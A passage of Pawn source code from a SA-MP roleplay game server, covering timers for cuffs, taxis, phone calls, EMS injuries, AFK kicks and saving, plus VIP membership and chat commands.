					IsCopDragging[PlayerDraggedBy[i]] = INVALID_PLAYER_ID;
					PlayerDragged[i] = 0;
					PlayerDraggedBy[i] = INVALID_PLAYER_ID;
				}
				if(IsPlayerAttachedObjectSlotUsed(i, 0))
					RemovePlayerAttachedObject(i, 0);
			}
			else
			{
				PlayerCuffedTime[i] -= 1;
			}
		}
		if(PlayerCuffed[i] == 2)
		{
			if(PlayerCuffedTime[i] <= 0)
			{
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(i, X, Y, Z);
				new copinrange;
				foreach(Player, j)
				{
					if(IsPlayerInRangeOfPoint(j, 30, X, Y, Z) && IsACop(j))
					{
						copinrange = 1;
					}
				}

				if(copinrange == 0)
				{
					//Frozen[i] = 0;
					ClearAnimations(i, 1);
					SetPlayerSpecialAction(i, SPECIAL_ACTION_NONE);
					DeletePVar(i, "IsFrozen");
					GameTextForPlayer(i, "~r~You broke the cuffs, you're free!", 2500, 3);

				 	if(IsPlayerAttachedObjectSlotUsed(i, 0))
						RemovePlayerAttachedObject(i, 0);

					TogglePlayerControllable(i, 1);
					PlayerCuffed[i] = 0;
					DeletePVar(i, "PlayerCuffed");
					PlayerCuffedTime[i] = 0;
					if(PlayerDraggedBy[i] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[i]] = INVALID_PLAYER_ID;
						PlayerDragged[i] = 0;
						PlayerDraggedBy[i] = INVALID_PLAYER_ID;
					}

					new string[76];
					format(string, sizeof(string), "* %s has managed to wiggle out of the hand cuffs.", GetPlayerNameEx(i));
					ProxDetector(30.0, i, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else
				{
					PlayerCuffedTime[i] = 60;
				}
			}
			else
			{
				PlayerCuffedTime[i] -= 1;
			}
		}

		if(TransportDriver[i] < 999 && AdminDuty[i] == 0)
		{
			if(GetPlayerVehicleID(i) != GetPlayerVehicleID(TransportDriver[i]) || !TransportDuty[TransportDriver[i]])
			{
				if(IsPlayerConnected(TransportDriver[i]))
				{
					TransportMoney[TransportDriver[i]] += TransportCost[i];
					TransportTime[TransportDriver[i]] = 0;
					TransportCost[TransportDriver[i]] = 0;
					new string[36];
					format(string, sizeof(string), "~w~Passenger left~n~~g~Earned $%d",TransportCost[i]);
					GameTextForPlayer(TransportDriver[i], string, 5000, 1);
					TransportDriver[i] = 999;
				}
			}
			else if(TransportTime[i] >= 16 && AdminDuty[i] == 0)
			{
				TransportTime[i] = 1;
				if(TransportDriver[i] < 999)
				{
					if(IsPlayerConnected(TransportDriver[i]))
					{
	  					TransportCost[i] += TransportValue[TransportDriver[i]];
						TransportCost[TransportDriver[i]] = TransportCost[i];
					}
				}
			}
			TransportTime[i] += 1;
			new string[24];
			format(string, sizeof(string), "~r~%d ~w~: ~g~$%d",TransportTime[i],TransportCost[i]);
			GameTextForPlayer(i, string, 15000, 6);
			if(TransportCost[i] > GetPlayerCash(i))
			{
			    RemovePlayerFromVehicle(i);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(i, slx, sly, slz);
				SetPlayerPos(i, slx, sly, slz + 2);
			    GameTextForPlayer(i, "~r~You're flat out of cash!", 4000, 4);
			}
		}
	// end
	}
}

// Timer Name: ServerHeartbeatTwo()
// TickRate: 1 secs.
Timer:ServerHeartbeatTwo[1000]()
{
	foreach(Player, i)
	{
		if(CellTime[i] > 0)
		{
			if(CellTime[i] == cchargetime)
			{
				CellTime[i] = 1;
				if(Mobile[Mobile[i]] == i)
				{
					CallCost[i] += callcost;
				}
			}
			CellTime[i]++;
			if(Mobile[Mobile[i]] == INVALID_PLAYER_ID && CellTime[i] == 5)
			{
				if(IsPlayerConnected(Mobile[i]))
				{
				    new Float:rX, Float:rY, Float:rZ;
				    GetPlayerPos(i, rX, rY, rZ);
					new string[18 + MAX_PLAYER_NAME];
					format(string, sizeof(string), "* %s's phone rings.", GetPlayerNameEx(Mobile[i]));
					ProxDetector(30.0, Mobile[i], string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
			}
		}
		if(CellTime[i] == 0 && CallCost[i] > 0)
		{
			new string[28];
			format(string, sizeof(string), "~w~The call cost~n~~r~$%d",CallCost[i]);
			GivePlayerCash(i, -CallCost[i]);
			GameTextForPlayer(i, string, 5000, 1);
			CallCost[i] = 0;
		}
  		if(GetPVarType(i, "Injured"))
	    {
	        SetPlayerArmedWeapon(i, 0);
	        if(GetPVarInt(i, "EMSAttempt") == -1 || GetPVarInt(i, "EMSAttempt") == 1 || GetPVarInt(i, "EMSAttempt") == 2)
	        {
				if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
				{
					SendClientMessage(i, COLOR_WHITE, "You fell unconscious, you were immediately sent to the hospital.");
 					KillEMSQueue(i);
					SpawnPlayer(i);
				}
			}
		}
		if(GetPVarInt(i, "rccam") == 0)
 		{
			if(GetVehicleModel(GetPlayerVehicleID(i)) != 594)
			{
	 			DestroyVehicle(GetPVarInt(i, "rcveh"));
	 			VehicleRadioStation[GetPVarInt(i, "rcveh")] = 0;
	     		KillTimer(GetPVarInt(i, "rccamtimer"));
			}
		}
		if(IsPlayerInRangeOfPoint(i,2.0,1544.2,-1353.4,329.4))
		{ // Startower parachute
            if(PlayerInfo[i][pGuns][11] != 46)
            {
		    	GivePlayerValidWeapon(i, 46, 99999);
			}
		}
		if(GetPlayerState(i) == PLAYER_STATE_ONFOOT) for(new h = 0; h < sizeof(FamilyInfo); h++)
		{
			if(IsPlayerInRangeOfPoint(i, 2.0, FamilyInfo[h][FamilySafe][0], FamilyInfo[h][FamilySafe][1], FamilyInfo[h][FamilySafe][2]))
			{
				if(FamilyInfo[h][FamilyUSafe] == 1)
				{
					GameTextForPlayer(i, "~y~gang safe~w~~n~Type ~r~/safehelp~w~ for more information", 5000, 3);
				}
			}
		}
		for(new h = 0; h < sizeof(Points); h++)
		{
			if(IsPlayerInRangeOfPoint(i, 2.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
			{
				if(Points[h][Type] == 1 && GetPVarInt(i, "Packages") == 0)
				{
					GameTextForPlayer(i, "~w~Type /getmats to purchase a ~n~~r~materials package", 5000, 5);
				}
				else if(Points[h][Type] == 3 && PlayerInfo[i][pPot] < 3)
				{
					GameTextForPlayer(i, "~w~Type /getseeds to purchase some ~r~pot seeds", 5000, 5);
				}
				else if(Points[h][Type] == 4)
				{
					GameTextForPlayer(i, "~w~Type /getcrack to purchase some ~r~crack", 5000, 5);
				}
				else if(Points[h][Type] == 5)
				{
					GameTextForPlayer(i, "~w~Type /getcrate to purchase a ~r~crate", 5000, 5);
				}
			}
		}
	}
}

// Timer Name: playerTabbedLoop()
// TickRate: 1 secs.
Timer:playerTabbedLoop[1000]()
{
	foreach(Player, x)
	{
	    playerConnectedS[x]++;
	    if(playerSeconds[x] < gettime()-1 && playerTabbed[x] != 1 && playerConnectedS[x] >= 5 && 1 <= GetPlayerState(x) <= 3)
	    {
	        playerTabbed[x] = 1;
	        SetTimerEx("AFKick",1000,false,"d", x);
	    }
		playerLastTyped[x]++;
		GetPlayerPos(x, PlayerPos[x][0], PlayerPos[x][1], PlayerPos[x][2]);
		if(PlayerPos[x][0] == PlayerPos[x][3] && PlayerPos[x][1] == PlayerPos[x][4] && PlayerPos[x][2] == PlayerPos[x][5] && playerTabbed[x] != 1)
		{
		    if(playerLastTyped[x] < playerAFKTime[x]) playerAFKTime[x] = playerLastTyped[x];
		    if(playerAFK[x] != 0) playerAFKTime[x]++;
		    else playerAFK[x] = 1;
		    if(playerAFKTime[x] >= 900 && PlayerInfo[x][pAdmin] < 5)
			{
			    SendClientMessage(x, COLOR_WHITE, "You have been kicked for being AFK for more than 15 minutes.");
				Kick(x);
			}
		}
		else
		{
		    if(playerAFK[x] != 0) playerAFK[x] = 0, playerAFKTime[x] = 0;
		}
		PlayerPos[x][3] = PlayerPos[x][0];
		PlayerPos[x][4] = PlayerPos[x][1];
		PlayerPos[x][5] = PlayerPos[x][2];
	}
}

// Timer Name: EMSUpdate()
// TickRate: 5 secs.
Timer:EMSUpdate[5000]()
{
	foreach(Player, i)
	{
		new Float:posX, Float:posY, Float:posZ;
 		GetPlayerPos(i, posX, posY, posZ);
		if(GetPlayerInterior(i) == 0 && !IsPlayerInAnyVehicle(i) && MP3Station[i] == 0)
		{
	    	StopAudioStreamForPlayer(i);
		}

		new Float:iArmor;
		GetPlayerArmour(i, iArmor);
		if(iArmor > ValidArmor[i] && AdminDuty[i] == 0)
		{
		    new string[128];
			format(string, sizeof(string), "%s may have hacked their armor.", GetPlayerNameEx(i));
			AddAutomatedFlag(i, string);
			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) may possibly be armor hacking.", GetPlayerNameEx(i), i);
			ABroadCast(COLOR_YELLOW, string, 2);
		}

	    if(GetPVarType(i, "Injured"))
	    {
	        if(GetPVarInt(i, "EMSAttempt") != 0)
			{

				new Float:health;
 				GetPlayerHealth(i,health);
				SetPlayerHealth(i, health-1);
				if(GetPVarInt(i, "EMSAttempt") == -1)
				{
    				if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
	    			{
	        			SendClientMessage(i, COLOR_WHITE, "You fell unconscious, you were immediately sent to the hospital.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
	    			}
					GameTextForPlayer(i, "~r~Injured~n~~w~/accept death or /service ems", 5000, 3);
				}
				if(GetPVarInt(i, "EMSAttempt") == 1)
				{
	    			if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
	    			{
	        			SendClientMessage(i, COLOR_WHITE, "You fell unconscious, you were immediately sent to the hospital.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
	    			}
					GameTextForPlayer(i, "~r~Injured~n~~w~Waiting for EMS to Arrive...", 5000, 3);
				}
				if(GetPVarInt(i, "EMSAttempt") == 2)
				{
	    			if(!IsPlayerInRangeOfPoint(i, 3.0, GetPVarFloat(i,"MedicX"), GetPVarFloat(i,"MedicY"), GetPVarFloat(i,"MedicZ")))
	    			{
	        			SendClientMessage(i, COLOR_WHITE, "You fell unconscious, you were immediately sent to the hospital.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
	    			}
	    			GameTextForPlayer(i, "~g~Rescued~n~~w~Awaiting Treatment...", 5000, 3);
				}
				if(GetPVarInt(i, "EMSAttempt") == 3)
				{
	    			if(IsPlayerInAnyVehicle(i))
	    			{
	        			new ambmodel = GetPlayerVehicleID(i);
	        			if(IsAnAmbulance(ambmodel))
	        			{
	    					GameTextForPlayer(i, "~g~Rescued~n~~w~Waiting for EMS to take to Hospital...", 5000, 3);
						}
						else
						{
		    				SendClientMessage(i, COLOR_WHITE, "You fell unconscious due to no life support, you were immediately sent to the hospital.");
	        				KillEMSQueue(i);
							SpawnPlayer(i);
						}
					}
					else
					{
		    			SendClientMessage(i, COLOR_WHITE, "You fell out of the vehicle, you were immediately sent to the hospital.");
	        			KillEMSQueue(i);
						SpawnPlayer(i);
					}
				}

				GetPlayerHealth(i, health);
				if(health <= 5)
				{
	    			SendClientMessage(i, COLOR_WHITE, "You fell unconscious, you were immediately sent to the hospital.");
	    			KillEMSQueue(i);
					SpawnPlayer(i);
				}
	        }
	    }
	}
}

// Timer Name: ProductionUpdate()
// TickRate: 5 Minutes.
Timer:ProductionUpdate[300000]()
{
	foreach(Player, i)
	{
		if(playerTabbed[i] != 1)
		{
			if(PlayerInfo[i][pPayReady] < 6) { PlayerInfo[i][pPayReady] += 1; } //+ 5 min to PayDay anti-abuse
		}
		if(PlayerInfo[i][pFishes] >= 5) {
			if(FishCount[i] >= 3) PlayerInfo[i][pFishes] = 0;
			else ++FishCount[i];
		}
	}
	SaveFamilies();
}

// Timer Name: SyncUp()
// TickRate: 1 Minute.
Timer:SyncUp[60000]()
{
	new string[128];
	new hour,minuite,second;

	SyncTime();
	ScoreUpdate();

	gettime(hour,minuite,second);
	FixHour(hour);
	hour = shifthour;
	if(minuite < 10)
	{
		format(string, sizeof(string), "%d:0%d", hour, minuite);
	}
	else
	{
		format(string, sizeof(string), "%d:%d", hour, minuite);
	}
	TextDrawSetString(WristWatch, string);

	foreach(Player, i)
	{
		if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && PlayerInfo[i][pWeedGrowth] < 45) switch(PlayerInfo[i][pDrugsSkill])
		{
			case 0 .. 50: PlayerInfo[i][pWeedGrowth] += 1;
			case 51 .. 100: PlayerInfo[i][pWeedGrowth] += 2;
			case 101 .. 200: PlayerInfo[i][pWeedGrowth] += 3;
			case 201 .. 400: PlayerInfo[i][pWeedGrowth] += 4;
			default: PlayerInfo[i][pWeedGrowth] += 5;
		}
		switch(GetPVarInt(i, "STD"))
		{
			case 1:
			{
				new Float: health;
				GetPlayerHealth(i, health);
				SetPlayerHealth(i, health - 5.0);
				SendClientMessage(i, COLOR_LIGHTBLUE, "* Lost 4 health due to STD.");
			}
			case 2:
			{
				new Float: health;
				GetPlayerHealth(i, health);
				SetPlayerHealth(i, health - 12.0);
				SendClientMessage(i, COLOR_LIGHTBLUE, "* Lost 8 health due to STD.");
			}
			case 3:
			{
				new Float: health;
				GetPlayerHealth(i, health);
				SetPlayerHealth(i, health - 20.0);
				SendClientMessage(i, COLOR_LIGHTBLUE, "* Lost 12 health due to STD.");
			}
		}
		if(GetPlayerCash(i) < 0)
		{
			if(!GetPVarType(i, "debtMsg"))
			{
				format(string, sizeof(string), "You're now in debt; you must repay the debt of $%d. If not, you will be arrested.", GetPlayerCash(i));
				SendClientMessage(i, COLOR_LIGHTRED, string);
				SetPVarInt(i, "debtMsg", 1);
			}
		}
		else DeletePVar(i, "debtMsg");
	}
}

// Timer Name: MoneyUpdate()
// Tickrate: 1 secs.
Timer:MoneyUpdate[1000]()
{
	new
		iTempVar;

	if(iAdverTimer >= 1)
		--iAdverTimer;

	new hour,minuite,second;
	gettime(hour,minuite,second);
	FixHour(hour);
	hour = shifthour;
	new tstring[7];
	if(minuite < 10)
	{
		format(tstring, sizeof(tstring), "%d:0%d", hour, minuite);
	}
	else
	{
		format(tstring, sizeof(tstring), "%d:%d", hour, minuite);
	}
	TextDrawSetString(WristWatch, tstring);

	foreach(Player, i)
	{
   		if(PlayerInfo[i][pCash] != GetPlayerMoney(i))
		{
			ResetPlayerMoney(i);
			GivePlayerMoney(i, PlayerInfo[i][pCash]);
		}

		if((iTempVar = GetPVarInt(i, "adT")) != 0)
		{
			if(--iTempVar <= 0) DeletePVar(i, "adT");
			else SetPVarInt(i, "adT", iTempVar);
		}

		if(PlayerInfo[i][pTriageTime] != 0)
		{
			PlayerInfo[i][pTriageTime]--;
  		}
		if(PlayerInfo[i][pTicketTime] != 0)
		{
			PlayerInfo[i][pTicketTime]--;
		}
		if(ServiceTime[i] != 0)
		{
			ServiceTime[i]--;
		}

		if(PlayerInfo[i][pGPS] > 0 && GetPVarType(i, "gpsonoff"))
		{
			new zone[28];
			GetPlayer2DZone(i, zone, MAX_ZONE_NAME);
			TextDrawSetString(GPS[i], zone);
		}
	}
}

// Timer Name: SpecUpdate()
// TickRate: 3 secs.
Timer:SpecUpdate[3000]()
{
	foreach(Player, i)
	{
	    if(PlayerInfo[i][pAdmin] >= 2)
	    {
		    if(Spectating[i] >= 1)
		    {
				if(Spectate[i] < 553)
				{
					new targetid = Spectate[i];
					if(!IsPlayerConnected(targetid))
					{
    					SendClientMessage(i, COLOR_WHITE, "The player you were spectating has left the server.");
			    		GettingSpectated[Spectate[i]] = 999;
			    		Spectating[i] = 0;
						Spectate[i] = 999;
						SetPVarInt(i, "SpecOff", 1);
						TogglePlayerSpectating(i, false);
						SetCameraBehindPlayer(i);
					}
				}
				if(Spectate[i] == 553)
				{
					TogglePlayerControllable(i, 1);
					TogglePlayerSpectating(i, 0);
					DeletePVar(i, "MedicBill");
					SpawnPlayer(i);
					Spectate[i] = 999;
					Spectating[i] = 0;
				}
				if(Spectate[i] == 556)
				{
					SetPlayerToTeamColor(i);
					Spectate[i] = 999;
				}
			}
		}
	}
}

// Timer Name: SaveUpdate()
// Tickrate: 3 Minutes.
Timer:SaveUpdate[180000]()
{
	foreach(Player, i)
	{
		if(GetPVarInt(i, "TempName") != 1 && gPlayerLogged[i] && GetPVarInt(i, "PBM") == 0 && GetPVarInt(i, "EventToken") == 0 && AdminDuty[i] == 0)
		{
			PlayerInfo[i][pInt] = GetPlayerInterior(i);
			new Float: fArmour;
			if(GetPVarType(i, "tabbedVW") != 0) {
				PlayerInfo[i][pVW] = GetPVarInt(i, "tabbedVW");
			} else PlayerInfo[i][pVW] = GetPlayerVirtualWorld(i);
			GetPlayerIp(i, PlayerInfo[i][pIP], 32);
			GetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y], PlayerInfo[i][pPos_z]);
			GetPlayerFacingAngle(i, PlayerInfo[i][pPos_r]);
			if(GetPlayerArmour(i, fArmour) < ValidArmor[i])	GetPlayerArmour(i, PlayerInfo[i][pArmor]);
			else PlayerInfo[i][pArmor] = ValidArmor[i];
			GetPlayerHealth(i, PlayerInfo[i][pHealth]);
		}
	}
	SaveFamilies();
	SaveFamiliesHQ();
	SaveHouses();
}

// Timer Name: ForceSaveTimer()
// Tickrate: 5 Minutes.
Timer:ForceSaveTimer[300000]()
{
	foreach(Player, i)
	{
		SaveAccount(i);
	}
	print("[ForceSaveTimer] All player accounts updated successfully.");
    UpdatePoints();
    print("[ForceSaveTimer] All points updated successfully.");
}

// Timer Name: ServerTime()
// Tickrate: 1 Second.
Timer:ServerTime[1000]()
{
    if(PSeconds > TimeFactor && (TimeFactor < -5))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+10;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -4))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+5;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -3))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -2))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < -1))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor && (TimeFactor < 1))
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	if(PSeconds > TimeFactor)
 	{
		PSeconds = 1;
		PMinutes = PMinutes+1;
 	}
	else
	{
		PSeconds = PSeconds+1;
	}
	if(PMinutes > 59)
	{
		PMinutes = 0;
		if(PHours > 23)
		{
			PHours = 0;
		}
		else
		{
			PHours = PHours+1;
		}
 	}
	foreach(Player, i)
	{
		SetPlayerTime(i,PHours,PMinutes);
	}
	return true;
}

CMD:tokenshop(playerid, params[])
{
	if(PlayerInfo[playerid][pVip] >= 2)
	{
	    ShowPlayerDialog(playerid, DIALOG_TOKENSHOP, DIALOG_STYLE_LIST, "VIP Token Shop", "First Aid Kit(2 Tokens)\nKelvar Vest(3 Tokens)\nWeapon Set 1(30 Tokens)\nWeapon Set 2(40 Tokens)\nWeapon Set 3(50 Tokens)\n\nFree Car(75 Tokens)", "Select", "Cancel");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "You must be atleast a Silver VIP to use this feature!");
	return 1;
}
CMD:viplocker(playerid, params[])
{
	if(PlayerInfo[playerid][pVip] >= 2)
	{
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 2561.32519531,1403.24609375,7699.56640625))
	{
	    ShowPlayerDialog(playerid, DIALOG_VIPLOCKER, DIALOG_STYLE_LIST, "VIP Locker", "Medical Kit(free)\nKelvar Vest(free)\nWeapons\nJob Picker\nVIP Color", "Select", "Cancel");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "You are not at the VIP Lockers, they are inside the VIP Lounge!");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "You must be atleast a Silver VIP to use this feature!");
	return 1;
}
//makevip commands
CMD:makevip(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] >= 4)
	{
		new giveplayerid, level, string[128];
		if(sscanf(params, "ud", giveplayerid, level))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setvip [playerid] [viplevel] ");
			SendClientMessage(playerid, COLOR_WHITE, "Available Levels: |0| None |1| Bronze |2| Silver |3| Gold |4| Platinum");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
		if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(level < 0 || level > 4)
				{
					SendClientMessage(playerid, COLOR_WHITE, "VIP Level can not be below 0 or above 4!");
					return 1;
				}
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
				if(level == 0)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You have removed that player's VIP level.");
					SendClientMessage(giveplayerid, COLOR_YELLOW, "Your VIP has been removed by an administrator.");
					PlayerInfo[giveplayerid][pVip] = 0;
		       		format(string, sizeof(string), "VIP: %s revoked %s VIP level", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			 		Log("logs/setvip.log", string);
					VIPmembers--;
					return 1;
				}
				if(level == 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You have made that player a Bronze VIP member.");
					SendClientMessage(giveplayerid, COLOR_YELLOW, "You have been made a Bronze VIP member by an administrator.");
					PlayerInfo[giveplayerid][pVip] = 1;
   					format(string, sizeof(string), "VIP: %s has set %s's VIP level to Bronze.", GetPlayerNameEx(playerid));
			 		Log("logs/setvip.log", string);
					VIPmembers++;
					return 1;
				}
				if(level == 2)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You have made that player a Silver VIP member.");
					SendClientMessage(giveplayerid, COLOR_YELLOW, "You have been made a Silver VIP member by an administrator.");
					PlayerInfo[giveplayerid][pVip] = 2;
   					format(string, sizeof(string), "VIP: %s has set %s's VIP level to Silver.", GetPlayerNameEx(playerid));
			 		Log("logs/setvip.log", string);
					VIPmembers++;
					return 1;
				}
				if(level == 3)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You have made that player a Gold VIP member.");
					SendClientMessage(giveplayerid, COLOR_YELLOW, "You have been made a Gold VIP member by an administrator.");
					PlayerInfo[giveplayerid][pVip] = 3;
   					format(string, sizeof(string), "VIP: %s has set %s's VIP level to Gold.", GetPlayerNameEx(playerid));
			 		Log("logs/setvip.log", string);
					VIPmembers++;
					return 1;
				}
				if(level == 4)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You have made that player a Platinum VIP member.");
					SendClientMessage(giveplayerid, COLOR_YELLOW, "You have been made a Platinum VIP member by an administrator.");
					PlayerInfo[giveplayerid][pVip] = 4;
   					format(string, sizeof(string), "VIP: %s has set %s's VIP level to Platinum.", GetPlayerNameEx(playerid));
			 		Log("logs/setvip.log", string);
					VIPmembers++;
					return 1;
				}
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You are not authorized to use that command.");
	}
	return 1;
}
CMD:togvip(playerid, params[])
{
    if(PlayerInfo[playerid][pVip] >= 1 || PlayerInfo[playerid][pAdmin] >= 2 || BuddyInvite[playerid] == 1) {
        if(GetPVarType(playerid, "togVIP")) {
            DeletePVar(playerid, "togVIP");
            SendClientMessageEx(playerid, COLOR_WHITE, "VIP chat disabled!");
        }
        else {
            SetPVarInt(playerid, "togVIP", 1);
            SendClientMessageEx(playerid, COLOR_WHITE, "VIP chat enabled!");
        }
    }
    else SendClientMessageEx(playerid, COLOR_WHITE, "You're not a VIP.");
    return 1;
}
//vip chat
CMD:v(playerid, params[]) {
	if(PlayerInfo[playerid][pVip] >= 1 || PlayerInfo[playerid][pAdmin] >= 2) {
		if(isnull(params)) {
			SendClientMessageEx(playerid, COLOR_WHITE, "USAGE: /v [message]");
		}
		else if(gettime() < GetPVarInt(playerid, "timeVIP")) {

			new
				szMessage[64];

			format(szMessage, sizeof(szMessage), "You must wait %d seconds before speaking again in this channel.", GetPVarInt(playerid, "timeVIP") - gettime());
			SendClientMessageEx(playerid, COLOR_YELLOW, szMessage);
		}
		else if(!GetPVarType(playerid, "togVIP")) {
		    SendClientMessageEx(playerid, COLOR_WHITE, "You have VIP chat toggled | /togvip to enable it!");
		}
		else if(PlayerInfo[playerid][pVMuted] > 0) {
			SendClientMessageEx(playerid, COLOR_LIGHTRED, "You are muted from the VIP chat channel!");
		}
		else {

			new
				szMessage[128];

			switch(PlayerInfo[playerid][pAdmin])
			{
				case 2: format(szMessage, sizeof(szMessage), "** Junior Administrator %s: %s", GetPlayerNameEx(playerid), params);
				case 3: format(szMessage, sizeof(szMessage), "** General Administrator %s: %s", GetPlayerNameEx(playerid), params);
				case 4: format(szMessage, sizeof(szMessage), "** Senior Administrator %s: %s", GetPlayerNameEx(playerid), params);
				case 5: format(szMessage, sizeof(szMessage), "** Head Administrator %s: %s", GetPlayerNameEx(playerid), params);
				case 6: format(szMessage, sizeof(szMessage), "** Executive Administrator %s: %s", GetPlayerNameEx(playerid), params);

				default:
				{

					SetPVarInt(playerid, "timeVIP", gettime() + 5);

					switch(PlayerInfo[playerid][pVip])
					{
						case 1: format(szMessage, sizeof(szMessage), "** Bronze VIP %s: %s", GetPlayerNameEx(playerid), params);
						case 2: format(szMessage, sizeof(szMessage), "** Silver VIP %s: %s", GetPlayerNameEx(playerid), params);
						case 3: format(szMessage, sizeof(szMessage), "** Gold VIP %s: %s", GetPlayerNameEx(playerid), params);
						case 4: format(szMessage, sizeof(szMessage), "** Platinum VIP %s: %s", GetPlayerNameEx(playerid), params);
						default: return SendClientMessageEx(playerid, COLOR_GREEN, "You have an invalid VIP level!");
					}
				}
			}
			SendVIPMessage(COLOR_VIP, szMessage);
		}
	}
	return 1;
}
//vip mute command
CMD:vipmute(playerid,params[])
{
    new string[92], giveplayerid;
   	if(PlayerInfo[playerid][pVip] == 4 || PlayerInfo[playerid][pAdmin] >= 4)
	{
    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, -1, "USAGE: /vipmute [playerid]");
 	if(IsPlayerConnected(giveplayerid))
	{
        SendClientMessage(playerid, COLOR_WHITE, "You have muted that player from VIP chat.");
		format(string, sizeof(string), "You have been muted from VIP chat by %s.", GetPlayerNameEx(playerid));
		SendClientMessageEx(giveplayerid, COLOR_LIGHTRED, string);
		PlayerInfo[giveplayerid][pVMuted] = 1;
    }
    }
    return 1;
}
/*temp vip invite (buddyinvite)*/
CMD:buddyinvite(playerid, params[])
{
	new giveplayerid, string[128];
	if(PlayerInfo[playerid][pVip] >= 3)
	{
	    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /buddyinvite [playerid]");

	    if(IsPlayerConnected(giveplayerid))
	    {
	        if(BuddyTimer[playerid] == 1)
	        {
	            SendClientMessage(playerid, COLOR_WHITE, "You cannot buddy invite yet!");
	        }
	        if(BuddyTimer[playerid] == 0)
	        {
	        BuddyInvite[giveplayerid] = 1;
	        BuddyTimer[playerid] = 1;
	        format(string, sizeof(string), "%s has buddy invited you!", GetPlayerNameEx(playerid));
	        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
   	     	format(string, sizeof(string), "You have buddy invited %s!", GetPlayerNameEx(giveplayerid));
	        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	        SendClientMessage(giveplayerid, COLOR_WHITE, "The buddy invite only lasts until you logout, so make the most of it!");
	        SendClientMessage(giveplayerid, COLOR_WHITE, "As the buddy invite system is free, you are only able to speak in the VIP chat. (/vchat)");
			format(string, sizeof(string), "VIP: %s has buddy-invited %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			Log("logs/vip.log", string);
	   }
	   }
	    else SendClientMessage(playerid, COLOR_WHITE, "That player is not connected!");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "You must be atleast a Gold VIP to use this feature!");
	return 1;
}
